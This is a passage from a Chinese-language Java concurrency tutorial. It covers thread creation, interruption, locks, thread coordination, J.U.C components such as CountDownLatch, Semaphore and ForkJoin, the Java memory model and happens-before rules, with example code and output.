三、中断  InterruptedException interrupted() Executor 的中断操作   四、互斥同步  synchronized ReentrantLock 比较 使用选择   五、线程之间的协作  join() wait() notify() notifyAll() await() signal() signalAll()   六、线程状态  新建（NEW） 可运行（RUNABLE） 阻塞（BLOCKED） 无限期等待（WAITING） 限期等待（TIMED_WAITING） 死亡（TERMINATED）   七、J.U.C - AQS  CountDownLatch CyclicBarrier Semaphore   八、J.U.C - 其它组件  FutureTask BlockingQueue ForkJoin   九、线程不安全示例 十、Java 内存模型  主内存与工作内存 内存间交互操作 内存模型三大特性 先行发生原则   十一、线程安全  不可变 互斥同步 非阻塞同步 无同步方案   十二、锁优化  自旋锁 锁消除 锁粗化 轻量级锁 偏向锁   十三、多线程开发良好的实践 参考资料    一、使用线程    有三种使用线程的方法：\n 实现 Runnable 接口； 实现 Callable 接口； 继承 Thread 类。  实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以理解为任务是通过线程驱动从而执行的。\n实现 Runnable 接口    需要实现接口中的 run() 方法。\npublic class MyRunnable implements Runnable { @Override public void run() { // ...  } } 使用 Runnable 实例再创建一个 Thread 实例，然后调用 Thread 实例的 start() 方法来启动线程。\npublic static void main(String[] args) { MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start(); } 实现 Callable 接口    与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。\npublic class MyCallable implements Callable\u0026lt;Integer\u0026gt; { public Integer call() { return 123; } } public static void main(String[] args) throws ExecutionException, InterruptedException { MyCallable mc = new MyCallable(); FutureTask\u0026lt;Integer\u0026gt; ft = new FutureTask\u0026lt;\u0026gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get()); } 继承 Thread 类    同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。\n当调用 start() 方法启动一个线程时，虚拟机会将该线程放入就绪队列中等待被调度，当一个线程被调度时会执行该线程的 run() 方法。\npublic class MyThread extends Thread { public void run() { // ...  } } public static void main(String[] args) { MyThread mt = new MyThread(); mt.start(); } 实现接口 VS 继承 Thread    实现接口会更好一些，因为：\n Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口； 类可能只要求可执行就行，继承整个 Thread 类开销过大。  二、基础线程机制    Executor    Executor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。\n主要有三种 Executor：\n CachedThreadPool：一个任务创建一个线程； FixedThreadPool：所有任务只能使用固定大小的线程； SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。  public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; 5; i++) { executorService.execute(new MyRunnable()); } executorService.shutdown(); } Daemon    守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。\n当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。\nmain() 属于非守护线程。\n在线程启动之前使用 setDaemon() 方法可以将一个线程设置为守护线程。\npublic static void main(String[] args) { Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true); } sleep()    Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。\nsleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。\npublic void run() { try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } yield()    对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。\npublic void run() { Thread.yield(); } 三、中断    一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。\nInterruptedException    通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。\n对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。\npublic class InterruptExample { private static class MyThread1 extends Thread { @Override public void run() { try { Thread.sleep(2000); System.out.println(\u0026#34;Thread run\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } } public static void main(String[] args) throws InterruptedException { Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println(\u0026#34;Main run\u0026#34;); } Main run java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) interrupted()    如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。\n但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。\npublic class InterruptExample { private static class MyThread2 extends Thread { @Override public void run() { while (!interrupted()) { // ..  } System.out.println(\u0026#34;Thread end\u0026#34;); } } } public static void main(String[] args) throws InterruptedException { Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt(); } Thread end Executor 的中断操作    调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。\n以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。\npublic static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; { try { Thread.sleep(2000); System.out.println(\u0026#34;Thread run\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); executorService.shutdownNow(); System.out.println(\u0026#34;Main run\u0026#34;); } Main run java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future\u0026lt;?\u0026gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。\nFuture\u0026lt;?\u0026gt; future = executorService.submit(() -\u0026gt; { // .. }); future.cancel(true); 四、互斥同步    Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。\nsynchronized    1. 同步一个代码块\npublic void func() { synchronized (this) { // ...  } } 它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。\n对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。\npublic class SynchronizedExample { public void func1() { synchronized (this) { for (int i = 0; i \u0026lt; 10; i++) { System.out.print(i + \u0026#34; \u0026#34;); } } } } public static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; e1.func1()); executorService.execute(() -\u0026gt; e1.func1()); } 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。\npublic static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; e1.func1()); executorService.execute(() -\u0026gt; e2.func1()); } 0 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. 同步一个方法\npublic synchronized void func () { // ... } 它和同步代码块一样，作用于同一个对象。\n3. 同步一个类\npublic void func() { synchronized (SynchronizedExample.class) { // ...  } } 作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。\npublic class SynchronizedExample { public void func2() { synchronized (SynchronizedExample.class) { for (int i = 0; i \u0026lt; 10; i++) { System.out.print(i + \u0026#34; \u0026#34;); } } } } public static void main(String[] args) { SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; e1.func2()); executorService.execute(() -\u0026gt; e2.func2()); } 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. 同步一个静态方法\npublic synchronized static void fun() { // ... } 作用于整个类。\nReentrantLock    ReentrantLock 是 java.util.concurrent（J.U.C）包中的锁。\npublic class LockExample { private Lock lock = new ReentrantLock(); public void func() { lock.lock(); try { for (int i = 0; i \u0026lt; 10; i++) { System.out.print(i + \u0026#34; \u0026#34;); } } finally { lock.unlock(); // 确保释放锁，从而避免发生死锁。  } } } public static void main(String[] args) { LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; lockExample.func()); executorService.execute(() -\u0026gt; lockExample.func()); } 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 比较    1. 锁的实现\nsynchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。\n2. 性能\n新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等，synchronized 与 ReentrantLock 大致相同。\n3. 等待可中断\n当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。\nReentrantLock 可中断，而 synchronized 不行。\n4. 公平锁\n公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。\nsynchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但是也可以是公平的。\n5. 锁绑定多个条件\n一个 ReentrantLock 可以同时绑定多个 Condition 对象。\n使用选择    除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。\n五、线程之间的协作    当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。\njoin()    在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。\n对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。\npublic class JoinExample { private class A extends Thread { @Override public void run() { System.out.println(\u0026#34;A\u0026#34;); } } private class B extends Thread { private A a; B(A a) { this.a = a; } @Override public void run() { try { a.join(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;B\u0026#34;); } } public void test() { A a = new A(); B b = new B(a); b.start(); a.start(); } } public static void main(String[] args) { JoinExample example = new JoinExample(); example.test(); } A B wait() notify() notifyAll()    调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。\n它们都属于 Object 的一部分，而不属于 Thread。\n只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateException。\n使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。\npublic class WaitNotifyExample { public synchronized void before() { System.out.println(\u0026#34;before\u0026#34;); notifyAll(); } public synchronized void after() { try { wait(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;after\u0026#34;); } } public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -\u0026gt; example.after()); executorService.execute(() -\u0026gt; example.before()); } before after wait() 和 sleep() 的区别\n wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法； wait() 会释放锁，sleep() 不会。  await() signal() signalAll()    java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。\n相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。\n使用 Lock 来获取一个 Condition 对象。\npublic class AwaitSignalExample { private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() { lock.lock(); try { System.out.println(\u0026#34;before\u0026#34;); condition.signalAll(); } finally { lock.unlock(); } } public void after() { lock.lock(); try { condition.await(); System.out.println(\u0026#34;after\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } finally { lock.unlock(); } } } public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -\u0026gt; example.after()); executorService.execute(() -\u0026gt; example.before()); } before after 六、线程状态    一个线程只能处于一种状态，并且这里的线程状态特指 Java 虚拟机的线程状态，不能反映线程在特定操作系统下的状态。\n新建（NEW）    创建后尚未启动。\n可运行（RUNABLE）    正在 Java 虚拟机中运行。但是在操作系统层面，它可能处于运行状态，也可能等待资源调度（例如处理器资源），资源调度完成就进入运行状态。所以该状态的可运行是指可以被运行，具体有没有运行要看底层操作系统的资源调度。\n阻塞（BLOCKED）    请求获取 monitor lock 从而进入 synchronized 函数或者代码块，但是其它线程已经占用了该 monitor lock，所以出于阻塞状态。要结束该状态进入从而 RUNABLE 需要其他线程释放 monitor lock。\n无限期等待（WAITING）    等待其它线程显式地唤醒。\n阻塞和等待的区别在于，阻塞是被动的，它是在等待获取 monitor lock。而等待是主动的，通过调用 Object.wait() 等方法进入。\n   进入方法 退出方法     没有设置 Timeout 参数的 Object.wait() 方法 Object.notify() / Object.notifyAll()   没有设置 Timeout 参数的 Thread.join() 方法 被调用的线程执行完毕   LockSupport.park() 方法 LockSupport.unpark(Thread)    限期等待（TIMED_WAITING）    无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。\n   进入方法 退出方法     Thread.sleep() 方法 时间结束   设置了 Timeout 参数的 Object.wait() 方法 时间结束 / Object.notify() / Object.notifyAll()   设置了 Timeout 参数的 Thread.join() 方法 时间结束 / 被调用的线程执行完毕   LockSupport.parkNanos() 方法 LockSupport.unpark(Thread)   LockSupport.parkUntil() 方法 LockSupport.unpark(Thread)    调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。\n死亡（TERMINATED）    可以是线程结束任务之后自己结束，或者产生了异常而结束。\nJava SE 9 Enum Thread.State\n七、J.U.C - AQS    java.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。\nCountDownLatch    用来控制一个或者多个线程等待多个线程。\n维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。\n\npublic class CountdownLatchExample { public static void main(String[] args) throws InterruptedException { final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; totalThread; i++) { executorService.execute(() -\u0026gt; { System.out.print(\u0026#34;run..\u0026#34;); countDownLatch.countDown(); }); } countDownLatch.await(); System.out.println(\u0026#34;end\u0026#34;); executorService.shutdown(); } } run..run..run..run..run..run..run..run..run..run..end CyclicBarrier    用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。\n和 CountdownLatch 相似，都是通过维护计数器来实现的。线程执行 await() 方法之后计数器会减 1，并进行等待，直到计数器为 0，所有调用 await() 方法而在等待的线程才能继续执行。\nCyclicBarrier 和 CountdownLatch 的一个区别是，CyclicBarrier 的计数器通过调用 reset() 方法可以循环使用，所以它才叫做循环屏障。\nCyclicBarrier 有两个构造函数，其中 parties 指示计数器的初始值，barrierAction 在所有线程都到达屏障的时候会执行一次。\npublic CyclicBarrier(int parties, Runnable barrierAction) { if (parties \u0026lt;= 0) throw new IllegalArgumentException(); this.parties = parties; this.count = parties; this.barrierCommand = barrierAction; } public CyclicBarrier(int parties) { this(parties, null); } \npublic class CyclicBarrierExample { public static void main(String[] args) { final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; totalThread; i++) { executorService.execute(() -\u0026gt; { System.out.print(\u0026#34;before..\u0026#34;); try { cyclicBarrier.await(); } catch (InterruptedException | BrokenBarrierException e) { e.printStackTrace(); } System.out.print(\u0026#34;after..\u0026#34;); }); } executorService.shutdown(); } } before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. Semaphore    Semaphore 类似于操作系统中的信号量，可以控制对互斥资源的访问线程数。\n以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。\npublic class SemaphoreExample { public static void main(String[] args) { final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; totalRequestCount; i++) { executorService.execute(()-\u0026gt;{ try { semaphore.acquire(); System.out.print(semaphore.availablePermits() + \u0026#34; \u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } finally { semaphore.release(); } }); } executorService.shutdown(); } } 2 1 2 2 2 2 2 1 2 2 八、J.U.C - 其它组件    FutureTask    在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future\u0026lt;V\u0026gt; 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future\u0026lt;V\u0026gt; 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。\npublic class FutureTask\u0026lt;V\u0026gt; implements RunnableFuture\u0026lt;V\u0026gt; public interface RunnableFuture\u0026lt;V\u0026gt; extends Runnable, Future\u0026lt;V\u0026gt; FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。\npublic class FutureTaskExample { public static void main(String[] args) throws ExecutionException, InterruptedException { FutureTask\u0026lt;Integer\u0026gt; futureTask = new FutureTask\u0026lt;Integer\u0026gt;(new Callable\u0026lt;Integer\u0026gt;() { @Override public Integer call() throws Exception { int result = 0; for (int i = 0; i \u0026lt; 100; i++) { Thread.sleep(10); result += i; } return result; } }); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -\u0026gt; { System.out.println(\u0026#34;other task is running...\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } }); otherThread.start(); System.out.println(futureTask.get()); } } other task is running... 4950 BlockingQueue    java.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现：\n FIFO 队列 ：LinkedBlockingQueue、ArrayBlockingQueue（固定长度） 优先级队列 ：PriorityBlockingQueue  提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。\n使用 BlockingQueue 实现生产者消费者问题\npublic class ProducerConsumer { private static BlockingQueue\u0026lt;String\u0026gt; queue = new ArrayBlockingQueue\u0026lt;\u0026gt;(5); private static class Producer extends Thread { @Override public void run() { try { queue.put(\u0026#34;product\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print(\u0026#34;produce..\u0026#34;); } } private static class Consumer extends Thread { @Override public void run() { try { String product = queue.take(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print(\u0026#34;consume..\u0026#34;); } } } public static void main(String[] args) { for (int i = 0; i \u0026lt; 2; i++) { Producer producer = new Producer(); producer.start(); } for (int i = 0; i \u0026lt; 5; i++) { Consumer consumer = new Consumer(); consumer.start(); } for (int i = 0; i \u0026lt; 3; i++) { Producer producer = new Producer(); producer.start(); } } produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. ForkJoin    主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。\npublic class ForkJoinExample extends RecursiveTask\u0026lt;Integer\u0026gt; { private final int threshold = 5; private int first; private int last; public ForkJoinExample(int first, int last) { this.first = first; this.last = last; } @Override protected Integer compute() { int result = 0; if (last - first \u0026lt;= threshold) { // 任务足够小则直接计算  for (int i = first; i \u0026lt;= last; i++) { result += i; } } else { // 拆分成小任务  int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); } return result; } } public static void main(String[] args) throws ExecutionException, InterruptedException { ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get()); } ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。\npublic class ForkJoinPool extends AbstractExecutorService ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。\n\n九、线程不安全示例    如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。\n以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值有可能小于 1000。\npublic class ThreadUnsafeExample { private int cnt = 0; public void add() { cnt++; } public int get() { return cnt; } } public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; threadSize; i++) { executorService.execute(() -\u0026gt; { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get()); } 997 十、Java 内存模型    Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。\n主内存与工作内存    处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。\n加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。\n\n所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。\n线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。\n\n内存间交互操作    Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。\n\n read：把一个变量的值从主内存传输到工作内存中 load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中 use：把工作内存中一个变量的值传递给执行引擎 assign：把一个从执行引擎接收到的值赋给工作内存的变量 store：把工作内存的一个变量的值传送到主内存中 write：在 store 之后执行，把 store 得到的值放入主内存的变量中 lock：作用于主内存的变量 unlock  内存模型三大特性    1. 原子性    Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。\n有一个错误认识就是，int 等原子性的类型在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。\n为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。\n下图演示了两个线程同时对 cnt 进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。\n\nAtomicInteger 能保证多个线程修改的原子性。\n\n使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现：\npublic class AtomicExample { private AtomicInteger cnt = new AtomicInteger(); public void add() { cnt.incrementAndGet(); } public int get() { return cnt.get(); } } public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; AtomicExample example = new AtomicExample(); // 只修改这条语句  final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; threadSize; i++) { executorService.execute(() -\u0026gt; { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get()); } 1000 除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的原子性。它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。\npublic class AtomicSynchronizedExample { private int cnt = 0; public synchronized void add() { cnt++; } public synchronized int get() { return cnt; } } public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i \u0026lt; threadSize; i++) { executorService.execute(() -\u0026gt; { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get()); } 1000 2. 可见性    可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。\n主要有三种实现可见性的方式：\n volatile synchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。 final，被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。  对前面的线程不安全示例中的 cnt 变量使用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。\n3. 有序性    有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。\nvolatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。\n也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。\n先行发生原则    上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。\n1. 单一线程原则     Single Thread rule\n 在一个线程内，在程序前面的操作先行发生于后面的操作。\n\n2. 管程锁定规则     Monitor Lock Rule\n 一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。\n\n3. volatile 变量规则     Volatile Variable Rule\n 对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。\n\n4. 线程启动规则     Thread Start Rule\n Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。\n\n5. 线程加入规则     Thread Join Rule\n Thread 对象的结束先行发生于 join() 方法返回。\n\n6. 线程中断规则     Thread Interruption Rule\n 对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 interrupted() 方法检测到是否有中断发生。\n7. 对象终结规则     Finalizer Rule\n 一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。\n8. 传递性     Transitivity\n 如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。\n十一、线程安全    多个线程不管以何种方式访问某个类，并且在主调代码中不需要进行同步，都能表现正确的行为。\n线程安全有以下几种实现方式：\n不可变    不可变（Immutable）的对象一定是线程安全的，不需要再采取任何的线程安全保障措施。只要一个不可变的对象被正确地构建出来，永远也不会看到它在多个线程之中处于不一致的状态。多线程环境下，应当尽量使对象成为不可变，来满足线程安全。\n不可变的类型：\n final 关键字修饰的基本数据类型 String 枚举类型 Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的原子类 AtomicInteger 和 AtomicLong 则是可变的。  对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。\npublic class ImmutableExample { public static void main(String[] args) { Map\u0026lt;String, Integer\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;String, Integer\u0026gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put(\u0026#34;a\u0026#34;, 1); } } Exception in thread \u0026#34;main\u0026#34; java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。\npublic V put(K key, V value) { throw new UnsupportedOperationException(); } 互斥同步    synchronized 和 ReentrantLock。\n非阻塞同步    